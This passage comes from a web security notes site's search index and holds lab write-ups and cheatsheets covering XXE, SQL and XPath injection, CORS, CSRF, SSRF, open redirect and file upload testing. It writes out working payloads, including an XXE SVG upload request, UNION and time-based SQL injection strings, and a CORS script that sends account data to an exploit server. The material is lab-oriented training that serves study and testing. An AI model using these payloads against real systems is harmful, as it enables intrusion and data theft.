the will include the content of the /etc/hostname file as text in the image. Put this in a file and name it image.svg</p> image.svg<pre><code>&lt;?xml version=\"1.0\" standalone=\"yes\"?&gt;\n&lt;!DOCTYPE test [ &lt;!ENTITY xxe SYSTEM \"file:///etc/hostname\" &gt; ]&gt;\n&lt;svg width=\"128px\" height=\"128px\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" version=\"1.1\"&gt;\n   &lt;text font-size=\"16\" x=\"0\" y=\"16\"&gt;&amp;xxe;&lt;/text&gt;\n&lt;/svg&gt;\n</code></pre> <p>Now we can just upload that image as an avatar on a blog post comment.</p> Uploading the svg image<pre><code>POST /post/comment HTTP/1.1\nHost: 0ac50066032ed70f8050a3b600560089.web-security-academy.net\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:145.0) Gecko/20100101 Firefox/145.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate, br, zstd\nContent-Type: multipart/form-data; boundary=----geckoformboundarya9d222b803c73cad101ae7c9d83a2213\nContent-Length: 1219\nOrigin: https://0ac50066032ed70f8050a3b600560089.web-security-academy.net\nConnection: keep-alive\nReferer: https://0ac50066032ed70f8050a3b600560089.web-security-academy.net/post?postId=4\nCookie: session=F2VyadhnGPtL5393C7Rts4URNliCJQTh\nUpgrade-Insecure-Requests: 1\nSec-Fetch-Dest: document\nSec-Fetch-Mode: navigate\nSec-Fetch-Site: same-origin\nSec-Fetch-User: ?1\nX-PwnFox-Color: orange\nPriority: u=0, i\n\n------geckoformboundarya9d222b803c73cad101ae7c9d83a2213\nContent-Disposition: form-data; name=\"csrf\"\n\nsDBrnHtS5qphrN9aLtImJ1lo871ysPwn\n------geckoformboundarya9d222b803c73cad101ae7c9d83a2213\nContent-Disposition: form-data; name=\"postId\"\n\n4\n------geckoformboundarya9d222b803c73cad101ae7c9d83a2213\nContent-Disposition: form-data; name=\"comment\"\n\nTest comment\n------geckoformboundarya9d222b803c73cad101ae7c9d83a2213\nContent-Disposition: form-data; name=\"name\"\n\nTester1\n------geckoformboundarya9d222b803c73cad101ae7c9d83a2213\nContent-Disposition: form-data; name=\"avatar\"; filename=\"image.svg\"\nContent-Type: image/svg+xml\n\n&lt;?xml version=\"1.0\" standalone=\"yes\"?&gt;\n&lt;!DOCTYPE test [ &lt;!ENTITY xxe SYSTEM \"file:///etc/hostname\" &gt; ]&gt;\n&lt;svg width=\"128px\" height=\"128px\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" version=\"1.1\"&gt;\n   &lt;text font-size=\"16\" x=\"0\" y=\"16\"&gt;&amp;xxe;&lt;/text&gt;\n&lt;/svg&gt;\n\n------geckoformboundarya9d222b803c73cad101ae7c9d83a2213\nContent-Disposition: form-data; name=\"email\"\n\ntester1@test.com\n------geckoformboundarya9d222b803c73cad101ae7c9d83a2213\nContent-Disposition: form-data; name=\"website\"\n\n\n------geckoformboundarya9d222b803c73cad101ae7c9d83a2213--\n</code></pre> <p>Going back to the post, we see that our image has been uploaded successfully, and there is indeed text in the image. </p> <p></p> <p>Open the avatar image in a new tab to read the hostname.</p> <p></p> <p>In this case, the hostname is </p> Hostname<pre><code>52192edaa4ae\n</code></pre> <p>Submit this hostname to solve the lab.</p>","path":["Resources","Labs","PortSwigger","XXE","Exploiting XXE via image file upload"],"tags":["xxe","file-upload"]},{"location":"Resources/Labs/PortSwigger/XXE/xxe-lab-8/#lesson-learned","level":2,"title":"Lesson learned","text":"<p>Always check to see what file types are allowed on any upload form. If they allow SVG or DOCX, try to include an XXE payload.</p>","path":["Resources","Labs","PortSwigger","XXE","Exploiting XXE via image file upload"],"tags":["xxe","file-upload"]},{"location":"Resources/Labs/YesWeHack/SQL-Injection/1-simple-login-bypass/","level":1,"title":"Simple Login Bypass","text":"<p>This one is very simple. The payload is:</p> Simple login bypass<pre><code>pass' or '1'='1\n</code></pre> <p></p>","path":["Resources","Labs","YesWeHack","SQL Injection","Simple Login Bypass"],"tags":["sql","injection"]},{"location":"Resources/Labs/YesWeHack/SQL-Injection/2-first-exfiltration/","level":1,"title":"First Exfiltration","text":"<p>This one is also straightforward. It's just a basic UNION query. The correct payload is:</p> First exfiltration<pre><code>admin' UNION SELECT password,null from users-- -\n</code></pre> <p></p>","path":["Resources","Labs","YesWeHack","SQL Injection","First Exfiltration"],"tags":["sql","injection"]},{"location":"Resources/Labs/YesWeHack/SQL-Injection/3-no-limit/","level":1,"title":"No Limit","text":"<p>For this lab, we need to bypass the existing \"LIMIT 0\" directive to get the flag. The bypass is:</p> Limit bypass<pre><code>admin' LIMIT 1-- -\n</code></pre> <p></p>","path":["Resources","Labs","YesWeHack","SQL Injection","No Limit"],"tags":["sql","injection"]},{"location":"Resources/Labs/YesWeHack/SQL-Injection/4-exploration/","level":1,"title":"Exploration","text":"<p>In this lab, we need to find the hidden table. </p> <p>First, we can use the following payload to find the table names in the sqlite_schema:</p> Find all table names<pre><code>admin' UNION SELECT name from sqlite_schema where type=\"table\"-- -\n</code></pre> <p></p> <p>Now, to get the flag we can use the following payload:</p> Final payload<pre><code>admin' UNION SELECT * from 'H!dd3n_t4bl3'-- -\n</code></pre> <p></p>","path":["Resources","Labs","YesWeHack","SQL Injection","Exploration"],"tags":["sql","injection"]},{"location":"Resources/Labs/YesWeHack/SQL-Injection/5-injection-in-insert/","level":1,"title":"Injection in Insert","text":"<p>To solve this lab we need to abuse an input that is being placed directly into an insert query. We can use the following payload to solve the lab:</p> Injecting into an insert statement<pre><code>test@test.com', (SELECT password FROM users WHERE username = 'admin'));-- -\n</code></pre> <p></p>","path":["Resources","Labs","YesWeHack","SQL Injection","Injection in Insert"],"tags":["sql","injection"]},{"location":"Resources/Labs/YesWeHack/SQL-Injection/6-filter-bypass/","level":1,"title":"Filter Bypass","text":"<p>This one was tricky. To solve this lab, we need to bypass several filters. First, spaces are filtered, and so is the word \"password\". </p> <p>The payload that works to solve this lab is:</p> SQL filter bypass<pre><code>test@companyname)'\nUNION/**/SELECT/**/passpasswordword,null/**/FROM/**/users/**/WHERE/**/username/**/=/**/'admin'--\n</code></pre> <p>Let's break this down:</p> <p>According to PortSwigger research, comments can be used to bypass a filter on spaces. So instead of spaces, I'm using <code>/**/</code> instead. That bypasses the first part. </p> <p>Then, the word \"password\" is filtered. However, it's not being filtered recursively, so we can add \"password\" in the middle of the word. That way, when the filter strips out the first \"password\" it finds, the rest of the string will collapse and we will have bypassed the filter. </p> <p></p>","path":["Resources","Labs","YesWeHack","SQL Injection","Filter Bypass"],"tags":["sql","injection","filter-bypass"]},{"location":"Resources/Labs/YesWeHack/XPath-Injection/1-simple-login-bypass/","level":1,"title":"Simple Login Bypass","text":"<p>To solve this lab, we just need to bypass the login and login as the admin.</p> <p>The following payload bypasses the login form:</p> Simple login bypass<pre><code>pass' or 'a'='a\n</code></pre> <p></p>","path":["Resources","Labs","YesWeHack","XPath Injection","Simple Login Bypass"],"tags":["xpath","injection"]},{"location":"Resources/Methodology/Cheatsheets/authentication-cheatsheet/","level":1,"title":"Authentication Cheatsheet","text":"","path":["Resources","Methodology","Cheatsheets","Authentication Cheatsheet"],"tags":["authn","cheatsheet"]},{"location":"Resources/Methodology/Cheatsheets/authentication-cheatsheet/#approaching-login-pages","level":2,"title":"Approaching login pages","text":"<ul> <li> Check for rate limiting/account lockout</li> <li> Check for weak credentials (<code>admin</code>, <code>password</code>, common/leaked password lists)</li> <li> Does the application respond differently to valid and invalid usernames?<ul> <li>Check for subtle differences as well, including timing disparities</li> </ul> </li> <li> Password reset flow<ul> <li>Can we leak password reset tokens</li> <li>Email injection</li> </ul> </li> <li> Is there MFA?<ul> <li>Is it enforced?</li> <li>Can the MFA be brute forced?</li> <li>Bypassed?</li> </ul> </li> <li> Content discovery to find hidden registration pages</li> <li> Check client-side JS files for additional endpoints that may allow registration</li> <li> Review responses to see if tokens or any sensitive information is returned<ul> <li>Consider fuzzing API endpoints to see if any return tokens or information that could be used</li> </ul> </li> <li> Carefully review password reset email requests<ul> <li>Is there a way to change where the reset token gets sent?</li> </ul> </li> <li> Can we bypass auth with IP spoofing?</li> <li> Check for mass assignment vulnerabilities</li> <li> Check SSO</li> <li> Carefully review SAML/OAuth2</li> <li> </li> </ul>","path":["Resources","Methodology","Cheatsheets","Authentication Cheatsheet"],"tags":["authn","cheatsheet"]},{"location":"Resources/Methodology/Cheatsheets/broken-access-control/","level":1,"title":"Broken Access Control Cheatsheet","text":"","path":["Resources","Methodology","Cheatsheets","Broken Access Control Cheatsheet"],"tags":["BAC","BFLA","BOLA","IDOR"]},{"location":"Resources/Methodology/Cheatsheets/broken-access-control/#definition-of-terms","level":2,"title":"Definition of Terms","text":"Broken Object Level Authorization Being able to see something you shouldn't be able to see Broken Functional Level Authorization Being able to do something you shouldn't be able to do Insecure Direct Object Reference Kind of an umbrella term","path":["Resources","Methodology","Cheatsheets","Broken Access Control Cheatsheet"],"tags":["BAC","BFLA","BOLA","IDOR"]},{"location":"Resources/Methodology/Cheatsheets/broken-access-control/#checks","level":2,"title":"Checks","text":"<ul> <li> Understand how the application works<ul> <li>How does it fetch/create/modify/delete data?</li> </ul> </li> <li> Look for numerical id's in requests<ul> <li>URL query string</li> <li>POST body</li> <li>etc.</li> </ul> </li> <li> Test with two users and swap ids to see if you can access the other user's data</li> <li> Look for any encrypted/encoded data that may be used to fetch data.<ul> <li>Try to understand how it's created and see if we can spoof it</li> </ul> </li> <li> Check to see if there is a way to leak the UUID of the other user, if used.<ul> <li>Report a user</li> <li>Look at the profile image</li> <li>Any other way of interacting with a user</li> </ul> </li> <li> Use a plugin like autorize to help automate testing</li> <li> Can a low user perform admin actions</li> <li> Are boundaries between roles properly enforced?<ul> <li>Be sure to check the actual API calls, not just what is in the browser. </li> </ul> </li> <li> Check VERBS besides just GET<ul> <li>Particularly in state-changing actions</li> </ul> </li> </ul> <p>Important note</p> <p>Not every IDOR/BAC constitutes a security vulnerability. If the only thing leaked is information that is already accessible on the site, then it's not a valid vulnerability. Be sure to carefully review the impact for any IDOR/BAC you identify to make sure that it's an actual vulnerability. </p>","path":["Resources","Methodology","Cheatsheets","Broken Access Control Cheatsheet"],"tags":["BAC","BFLA","BOLA","IDOR"]},{"location":"Resources/Methodology/Cheatsheets/cors-cheatsheet/","level":1,"title":"CORS Cheatsheet","text":"<p>Browser mechanism that allows controlled relaxation of the Same Origin Policy (SOP). It allows hosts on origin A to request and read responses of hosts on origin B. </p>","path":["Resources","Methodology","Cheatsheets","CORS Cheatsheet"],"tags":["cors","cheatsheet"]},{"location":"Resources/Methodology/Cheatsheets/cors-cheatsheet/#checks","level":2,"title":"Checks","text":"<ul> <li> Look for <code>Access-Control-Allow-Origin</code> and <code>Access-Control-Allow-Credentials</code> headers in HTTP responses</li> <li> Try:<ul> <li>Arbitrary origins reflected</li> <li>Arbitrary subdomains</li> <li>Check for misconfigured filters, e.g., <code>example.comevil.com</code> or <code>example.com.evil.com</code></li> <li>Check for null origin</li> <li>Check insecure protocols</li> </ul> </li> </ul>","path":["Resources","Methodology","Cheatsheets","CORS Cheatsheet"],"tags":["cors","cheatsheet"]},{"location":"Resources/Methodology/Cheatsheets/cors-cheatsheet/#examples","level":2,"title":"Examples","text":"Basic origin reflection<pre><code>&lt;script&gt;\n    var req = new XMLHttpRequest();\n    req.onload = reqListener;\n    req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true);\n    req.withCredentials = true;\n    req.send();\n\n    function reqListener() {\n        location='/log?key='+this.responseText;\n    };\n&lt;/script&gt;\n</code></pre> NULL origin<pre><code>&lt;iframe sandbox=\"allow-scripts allow-top-navigation allow-forms\" srcdoc=\"&lt;script&gt;\n    var req = new XMLHttpRequest();\n    req.onload = reqListener;\n    req.open('get','YOUR-LAB-ID.web-security-academy.net/accountDetails',true);\n    req.withCredentials = true;\n    req.send();\n    function reqListener() {\n        location='YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='+encodeURIComponent(this.responseText);\n    };\n&lt;/script&gt;\"&gt;&lt;/iframe&gt;\n</code></pre>","path":["Resources","Methodology","Cheatsheets","CORS Cheatsheet"],"tags":["cors","cheatsheet"]},{"location":"Resources/Methodology/Cheatsheets/cors-cheatsheet/#mitigations","level":2,"title":"Mitigations","text":"<ul> <li> Origins should be properly specified in the ACAO header<ul> <li> Don't dynamically reflect origins in the ACAO header</li> </ul> </li> <li> Avoid whitelisting NULL origins</li> <li> Avoid wildcards on internal networks</li> </ul>","path":["Resources","Methodology","Cheatsheets","CORS Cheatsheet"],"tags":["cors","cheatsheet"]},{"location":"Resources/Methodology/Cheatsheets/cors-cheatsheet/#references","level":2,"title":"References","text":"<ul> <li>PortSwigger URL Validation Bypass Cheatsheet</li> </ul>","path":["Resources","Methodology","Cheatsheets","CORS Cheatsheet"],"tags":["cors","cheatsheet"]},{"location":"Resources/Methodology/Cheatsheets/csrf-cheatsheet/","level":1,"title":"CSRF Cheatsheet","text":"<p>Cross-Site Request Forgery allows an attacker to perform an action on a victim's behalf without the victim knowing.</p> <p>Can't steal any data, but can perform a state-changing action.</p>","path":["Resources","Methodology","Cheatsheets","CSRF Cheatsheet"],"tags":["csrf","cheatsheet"]},{"location":"Resources/Methodology/Cheatsheets/csrf-cheatsheet/#checklist","level":2,"title":"Checklist","text":"<ul> <li> Look for:<ul> <li>State-changing action with no unique tokens</li> <li>Check if we can replicate the request without triggering CORS</li> <li>Develop a PoC. </li> </ul> </li> <li> CSRF Tokens<ul> <li>Can we remove the token?</li> <li>Can we remove the parameter altogether?</li> <li>Is the token tied to the user's session?</li> <li>Can the CSRF token be reused?</li> <li>Can we determine how the CSRF token is generated, and can we break it?</li> </ul> </li> </ul> <p>Example:</p> CSRF Example<pre><code>&lt;!DOCTYPE html&gt;\n  &lt;html&gt;\n  &lt;head&gt;\n      &lt;title&gt;CSRF PoC&lt;/title&gt;\n  &lt;/head&gt;\n  &lt;body&gt;\n      &lt;h3&gt;Standard CSRF PoC&lt;/h3&gt;\n      &lt;form action=\"https://nnjftadt.eu1.ctfio.com/email\" method=\"post\"&gt;\n      &lt;input type=\"hidden\" name=\"email\" value=\"pawpaw@hacks.dev\" /&gt;\n          &lt;input type=\"submit\" value=\"Submit request\" /&gt;\n      &lt;/form&gt;\n      &lt;script&gt;\n          history.pushState('', '', '/');\n          document.forms[0].submit();\n      &lt;/script&gt;\n  &lt;/body&gt;\n  &lt;/html&gt;\n</code></pre>","path":["Resources","Methodology","Cheatsheets","CSRF Cheatsheet"],"tags":["csrf","cheatsheet"]},{"location":"Resources/Methodology/Cheatsheets/csrf-cheatsheet/#csrf-bypasses","level":2,"title":"CSRF Bypasses","text":"<ul> <li> Check switching CSRF tokens between users</li> <li> Try removing the token and/or parameter</li> </ul>","path":["Resources","Methodology","Cheatsheets","CSRF Cheatsheet"],"tags":["csrf","cheatsheet"]},{"location":"Resources/Methodology/Cheatsheets/csrf-cheatsheet/#escalate-self-xss","level":2,"title":"Escalate Self-XSS","text":"<p>If you have a self XSS that would require the victim to fill out a form, it may be possible to chain the self-XSS -&gt; CSRF to develop a working exploit that has impact. </p> <p>NOTE</p> <p>This is particularly relevant for POST requests that are vulnerable to XSS</p> <p>Example</p> Escalate self-XSS example<pre><code>&lt;!DOCTYPE html&gt;\n  &lt;html&gt;\n  &lt;head&gt;\n      &lt;title&gt;CSRF PoC&lt;/title&gt;\n  &lt;/head&gt;\n  &lt;body&gt;\n      &lt;h3&gt;Standard CSRF PoC&lt;/h3&gt;\n      &lt;form action=\"https://70i2393j.eu4.ctfio.com/post/\" method=\"post\"&gt;\n      &lt;input type=\"hidden\" name=\"name\" value=\"test123&lt;script&gt;alert(1)&lt;/script&gt;\" /&gt;\n          &lt;input type=\"submit\" value=\"Submit request\" /&gt;\n      &lt;/form&gt;\n      &lt;script&gt;\n          history.pushState('', '', '/');\n          document.forms[0].submit();\n      &lt;/script&gt;\n  &lt;/body&gt;\n  &lt;/html&gt;\n</code></pre>","path":["Resources","Methodology","Cheatsheets","CSRF Cheatsheet"],"tags":["csrf","cheatsheet"]},{"location":"Resources/Methodology/Cheatsheets/local-file-read/","level":1,"title":"Local File Disclosure Cheatsheet","text":"<p>Could allow an attacker to include a file by exploiting a dynamic file read mechanism. This occurs due to the use of user-supplied input without proper sanitization. </p> <ul> <li>Could allow an attacker to read configuration files on the host machine</li> <li>Read any other arbitrary files</li> <li>Other types of information disclosure depending on how the server is implemented</li> </ul>","path":["Resources","Methodology","Cheatsheets","Local File Disclosure Cheatsheet"],"tags":["file-read","LFR"]},{"location":"Resources/Methodology/Cheatsheets/local-file-read/#checks","level":2,"title":"Checks","text":"<ul> <li> Look for anything that looks like it's loading an image or file<ul> <li>?image=</li> <li>?file=</li> <li>etc.</li> </ul> </li> <li> Try to access arbitrary files</li> <li> Test different path traversal sequences</li> <li> Test different encodings</li> <li> Check if path traversal strings are being stripped non-recursively</li> <li> Check if base directories might be hard-coded. If so, include those and traverse from there.</li> <li> Hail mary<ul> <li>Append a null byte <code>%00</code> or <code>?</code> after the path</li> </ul> </li> </ul>","path":["Resources","Methodology","Cheatsheets","Local File Disclosure Cheatsheet"],"tags":["file-read","LFR"]},{"location":"Resources/Methodology/Cheatsheets/local-file-read/#references","level":2,"title":"References","text":"<p>PayloadsAllTheThings</p> <p>HackTricks</p> <p>AppSecExplained</p>","path":["Resources","Methodology","Cheatsheets","Local File Disclosure Cheatsheet"],"tags":["file-read","LFR"]},{"location":"Resources/Methodology/Cheatsheets/open-redirect-cheatsheet/","level":1,"title":"Open Redirect Cheatsheet","text":"<p>Lack of server-side validation to ensure that redirect URLs are legitimate</p>","path":["Resources","Methodology","Cheatsheets","Open Redirect Cheatsheet"],"tags":["open-redirect","cheatsheet"]},{"location":"Resources/Methodology/Cheatsheets/open-redirect-cheatsheet/#checks","level":2,"title":"Checks","text":"<ul> <li> Try to add a domain we control in any redirect parameter, url=, redirect=, redirect_url=, etc.</li> <li> Check for misconfigured filtering. <ul> <li>google.com.demo instead of google.com</li> </ul> </li> <li> Try // instead of https://</li> </ul>","path":["Resources","Methodology","Cheatsheets","Open Redirect Cheatsheet"],"tags":["open-redirect","cheatsheet"]},{"location":"Resources/Methodology/Cheatsheets/open-redirect-cheatsheet/#sso","level":2,"title":"SSO","text":"<p>If there is an open redirect somewhere on the site, we might be able to abuse that in the context of an SSO login. </p> <p>Example:</p> Sample SSO redirect<pre><code>https://auth.barite.ctfio.com/auth?client_id=1&amp;redirect_url=https://barite.ctfio.com/redirect?url=https://tomfieber.github.io&amp;response_type=token\n</code></pre> <p>Note that the open redirect occurs within one functionality on the site: </p> <p><code>https://barite.ctfio.com/redirect?url=https://www.google.com</code></p> <p>But if we plug that into the <code>redirect_url</code> parameter of the SSO auth request, then we can control where the user is redirected after logging in.</p>","path":["Resources","Methodology","Cheatsheets","Open Redirect Cheatsheet"],"tags":["open-redirect","cheatsheet"]},{"location":"Resources/Methodology/Cheatsheets/open-redirect-cheatsheet/#bypasses","level":2,"title":"Bypasses","text":"<ul> <li> Check misconfigured regex<ul> <li><code>target.net/x//hacker.com</code></li> </ul> </li> <li> Try using an <code>@</code> symbol in the domain name<ul> <li><code>https://auth.bismuth.ctfio.com/auth?client_id=1&amp;redirect_url=https://bismuth.ctfio.com@tomfieber.github.io/&amp;response_type=token</code></li> </ul> </li> </ul>","path":["Resources","Methodology","Cheatsheets","Open Redirect Cheatsheet"],"tags":["open-redirect","cheatsheet"]},{"location":"Resources/Methodology/Cheatsheets/open-redirect-cheatsheet/#references","level":2,"title":"References","text":"<ul> <li>PayloadsAllTheThings</li> <li>HackTricks</li> <li>AppSecExplained</li> <li>PortSwigger URL Validation Bypass Cheatsheet</li> </ul>","path":["Resources","Methodology","Cheatsheets","Open Redirect Cheatsheet"],"tags":["open-redirect","cheatsheet"]},{"location":"Resources/Methodology/Cheatsheets/recon-cheatsheet/","level":1,"title":"Recon Cheatsheet","text":"","path":["Resources","Methodology","Cheatsheets","Recon Cheatsheet"],"tags":["recon","cheatsheet"]},{"location":"Resources/Methodology/Cheatsheets/sqli-cheatsheet/","level":1,"title":"SQL Injection Cheatsheet","text":"<ul> <li> Look for any endpoint/functionality that seems like it is touching the DB<ul> <li>Try injecting a single or double quote and look for changes in response</li> <li>Try adding comments on login forms to bypass authentication</li> <li>Try to enumerate the database type and version</li> </ul> </li> <li> Check if you can trigger an error<ul> <li>Visible errors</li> <li>Conditional errors (e.g., divide by zero)</li> </ul> </li> <li> Check if you can trigger a conditional response</li> <li> <p> Try to trigger a time delay</p> <ul> <li>sleep</li> <li>Examples:<ul> <li><code>test@test.com' and 1=sleep(3);-- -</code></li> <li><code>' or 1=(SELECT SLEEP(3) FROM information_schema.SCHEMATA WHERE SCHEMA_NAME like 'i%' LIMIT 1 );--</code></li> <li><code>' or 1=(SELECT SLEEP(3) FROM information_schema.TABLES WHERE TABLE_SCHEMA='sqli_four' and TABLE_NAME like 'u%' LIMIT 1 );--</code></li> <li><code>' and (SELECT sleep(3) from information_schema.COLUMNS where TABLE_SCHEMA = 'sqli_four' and TABLE_NAME = 'users' and COLUMN_NAME like 'u%' LIMIT 1);--+-</code></li> <li><code>' AND 1=(SELECT sleep(3) FROM users WHERE username = 'administrator' AND password like 'a%' LIMIT 1);-- -</code></li> </ul> </li> </ul> </li> <li> <p> Look for any input fields that may be inserting rows into the database and check those for injection as well. </p> <p>Warning</p> <p>Be careful with testing this. Inserting rows into the db without consideration has the potential to break something in the application.</p> <ul> <li>Examples<ul> <li><code>title',(SELECT GROUP_CONCAT(DISTINCT TABLE_SCHEMA) FROM information_schema.tables));--</code></li> <li><code>title',(SELECT GROUP_CONCAT(TABLE_NAME) FROM information_schema.tables where TABLE_SCHEMA='sqli_five'));--</code></li> <li><code>title',(SELECT GROUP_CONCAT(concat(id,':',username,':',password),'&lt;br&gt;') FROM sqli_five.users));--</code></li> </ul> </li> <li>Blind insert examples<ul> <li><code>test',sleep(5),'');-- -</code></li> <li><code>',( select sleep(5) where version() like '8%' ) ,'');--</code></li> <li><code>',( select sleep(5) from flag where flag like 'a%' ),'');--</code></li> </ul> </li> </ul> </li> </ul>","path":["Resources","Methodology","Cheatsheets","SQL Injection Cheatsheet"],"tags":[]},{"location":"Resources/Methodology/Cheatsheets/ssrf-cheatsheet/","level":1,"title":"SSRF Cheatsheet","text":"<p>An SSRF vulnerability allows an attacker to make requests originating from the web server</p>","path":["Resources","Methodology","Cheatsheets","SSRF Cheatsheet"],"tags":["ssrf"]},{"location":"Resources/Methodology/Cheatsheets/ssrf-cheatsheet/#checks","level":2,"title":"Checks","text":"<ul> <li> Look for anything that takes a URL input or fetches a resource (e.g., screenshot utility, pdf generator, etc.)</li> <li> If 127.0.0.1 or localhost aren't working, try variations to see if poor filtering rules are being used<ul> <li>Also make note of any internal IP addresses disclosed throughout the application. Try those to see if you can access resources on those hosts.</li> </ul> </li> <li> Check to see if the server can communicate with any other servers on the internal network</li> <li> Try to get an external interaction to a server we control. Collaborator, interactsh, etc.</li> </ul> <ul> <li> Try other URI schemes, <code>file://</code>, etc.</li> <li> Try looking for common images like <code>favicon.ico</code><ul> <li>Check the location of the image on the server</li> </ul> </li> </ul> <p>Important note</p> <p>Make sure the request is coming from the server and not your browser before reporting.</p>","path":["Resources","Methodology","Cheatsheets","SSRF Cheatsheet"],"tags":["ssrf"]},{"location":"Resources/Methodology/Cheatsheets/ssrf-cheatsheet/#bypasses","level":2,"title":"Bypasses","text":"Mitigation Bypass Whitelisting Look for an open redirect Blacklisting Create a custom CNAME and point it to the internal IP address of the targetCheck for poor regex handling Restricted content-types, characters, or extensions Fuzzing or finding a bypass (encoding, other) No response JavaScript XHR request","path":["Resources","Methodology","Cheatsheets","SSRF Cheatsheet"],"tags":["ssrf"]},{"location":"Resources/Methodology/Cheatsheets/ssrf-cheatsheet/#bypassing-blacklists","level":3,"title":"Bypassing blacklists","text":"<ul> <li> Try different ways of entering IP addresses. e.g., 127.1 instead of 127.0.0.1<ul> <li>Also try different encodings</li> </ul> </li> <li> Point a custom subdomain to 127.0.0.1 and use that<ul> <li>localhost.tomfieber.dev -&gt; 127.0.0.1</li> </ul> </li> <li> Use nip.io<ul> <li>127.0.0.1.nip.io -&gt; 127.0.0.1</li> </ul> </li> </ul>","path":["Resources","Methodology","Cheatsheets","SSRF Cheatsheet"],"tags":["ssrf"]},{"location":"Resources/Methodology/Cheatsheets/ssrf-cheatsheet/#bypassing-whitelists","level":3,"title":"Bypassing whitelists","text":"<ul> <li> Try to figure out how the filter is working<ul> <li>Can we append a domain we own? e.g., <code>victim.com.hacker.com</code></li> <li>Or <code>hackervictim.com</code></li> <li>etc.</li> </ul> </li> <li> Chaining an open redirect<ul> <li>If we can find an open redirect in another part of the application, we can use THAT URL with the SSRF to redirect to our desired site. <code>https://teal.ctfio.com/?redirect=https://YOUR-OAST-PAYLOAD</code></li> </ul> </li> <li> Chaining HTML injection/XSS<ul> <li>Try something like <code>&lt;script&gt;document.write(document.location)&lt;/script&gt;</code></li> <li>`","path":["Resources","Methodology","Cheatsheets","SSRF Cheatsheet"],"tags":["ssrf"]},{"location":"Resources/Methodology/Cheatsheets/upload-cheatsheet/","level":1,"title":"File Upload Cheatsheet","text":"","path":["Resources","Methodology","Cheatsheets","File Upload Cheatsheet"],"tags":["file-upload","cheatsheet"]},{"location":"Resources/Methodology/Cheatsheets/upload-cheatsheet/#checks","level":2,"title":"Checks","text":"<ul> <li> What technologies are in use?<ul> <li>Important to note to understand what type of web shell might work.</li> </ul> </li> <li> What file types are allowed?</li> <li> Is it possible to upload other filetypes by:<ul> <li>Changing the extension</li> <li>Changing the content type<ul> <li>Try changing to text/html with an XSS payload</li> </ul> </li> <li>Removing the content type</li> <li>Appending an allowed file extension</li> </ul> </li> <li> Is the check done on the client-side or the server-side?</li> <li> How is a normal file upload processed?<ul> <li>Is the filename changed?</li> <li>Is the file stored in a predictable place?</li> <li>Is it possible to access the uploaded file? How?</li> </ul> </li> <li> Is it possible to store the file in another location?<ul> <li>Check for path traversal in the filename</li> <li>Try over-writing sensitive files, e.g., authorized_keys -- Be careful with this!</li> </ul> </li> <li> Is the filename reflected in the response?<ul> <li>Check for an XSS or RCE in the filename</li> </ul> </li> <li> Try uploading an html file with an XSS payload<ul> <li>Make sure this is not intended behavior before reporting this. This is common in S3 buckets, but there's very little (if any) impact. </li> </ul> </li> <li> Can we upload an SVG<ul> <li>Check for XSS depending on where the file is uploaded. Remember that XSS executes in the context of the site.</li> <li>Check for XXE within the SVG if there is some kind of server-side functionality</li> </ul> </li> <li> Keep an eye out for CSP bypasses or uses in other parts of the app<ul> <li>If we can upload js and use that to bypass CSP with XSS in another part of the app</li> <li>Is there another functionality that uses XML files from uploads? SVGs?</li> </ul> </li> </ul>","path":["Resources","Methodology","Cheatsheets","File Upload Cheatsheet"],"tags":["file-upload","cheatsheet"]},{"location":"Resources/Methodology/Cheatsheets/xpath-injection/","level":1,"title":"XPath Injection","text":"<p>XPath injection is similar to SQL injection except for:</p> <ul> <li>It can only be used to read data, not to insert data</li> <li>It does not implement any access control, so if you find an injection point it's likely possible to get the whole document.</li> </ul>","path":["Resources","Methodology","Cheatsheets","XPath Injection"],"tags":["xpath","injection"]},{"location":"Resources/Methodology/Cheatsheets/xpath-injection/#syntax","level":2,"title":"Syntax","text":"","path":["Resources","Methodology","Cheatsheets","XPath Injection"],"tags":["xpath","injection"]},{"location":"Resources/Methodology/Cheatsheets/xpath-injection/#basics","level":3,"title":"Basics","text":"NodesPredicatesAuthentication Bypass Select all <code>module</code> child nodes of the context node <code>module</code> Select the document root node <code>/</code> Select descendant nodes of the context node <code>//</code> Select the context node <code>.</code> Select the parent of the context node <code>..</code> Select the <code>whatever</code> attribute node of the context node <code>@whatever</code> Select all text node child nodes of the context node <code>text()</code> <p>Select the first <code>name</code> child node of the <code>cats</code> node</p> <pre><code>/cats/name[1]\n\n/cats/name[position()=1]\n</code></pre> <p>Select the last name child node of the <code>cats</code> node</p> <pre><code>/cats/name[last()]\n</code></pre> <p>Select the first two <code>name</code> child nodes of the <code>cats</code> node</p> <pre><code>/cats/name[position()&lt;3]\n</code></pre> <p>Select the title of all courses where the tier element node equals 2</p> <pre><code>//course[tier=2]/title/text()\n</code></pre> <p>Select the <code>title</code> of all courses where the <code>author</code> element node has a <code>co-author</code> attribute node</p> <pre><code>//course/author[@co-author]/../title\n</code></pre> <p>Select all courses where the <code>tier</code> element node has a difficulty attribute node set to medium</p> <pre><code>//course/tier[@difficulty=\"medium\"]/..\n</code></pre> <p>Predicate Operands</p> Operand Explanation <code>+</code> Addition <code>-</code> Subtraction <code>*</code> Multiplication <code>div</code> Division <code>=</code> Equal <code>!=</code> Not Equal <code>&lt;</code> Less than <code>&lt;=</code> Less than or Equal <code>&gt;</code> Greater than <code>&gt;=</code> Greater than or Equal <code>or</code> Logical Or <code>and</code> Logical And <code>mod</code> Modulus <p>Wildcards</p> Query Explanation <code>node()</code> Matches any node <code>*</code> Matches any <code>element</code> node <code>@*</code> Matches any <code>attribute</code> node <p>Union</p> <p>Select the title of all modules in tiers 2 and 3</p> <pre><code>//module[tier=2]/title/text() | //module[tier=3]/title/text()\n</code></pre> <p>Bypass with known username</p> <pre><code>admin' or '1'='1\n</code></pre> <p>Bypass auth by position</p> <pre><code>' or position()=1 or '\n</code></pre> <p>Bypass auth by substring</p> <pre><code>' or contains(.,'admin') or '\n</code></pre>","path":["Resources","Methodology","Cheatsheets","XPath 